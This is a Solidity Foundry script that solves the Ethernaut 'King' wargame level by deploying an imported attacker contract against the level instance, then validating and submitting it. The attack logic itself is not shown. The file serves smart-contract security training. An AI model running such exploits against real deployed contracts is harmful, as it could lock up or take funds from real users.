// SPDX-License-Identifier: MIT

pragma solidity >=0.6.0 <0.9.0;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../utils/Ethernaut.sol";
import "./King.sol";
import "./KingAttacker.sol";

contract KingSolver is Test, Ethernaut {
    function run() public {
        IS_TEST = false;
        test();
    }

    function test() public broadcasted {
        King instance = King(getLevelInstanceWithValue(Levels.king, 1e15));
        KingAttacker attacker = new KingAttacker(address(instance));

        attacker.attack{ value: 1e15 }();

        require(validateLevelInstance(Levels.king, address(instance)), "no validation");

        if (!IS_TEST) submitLevelInstance(address(instance));
    }
}
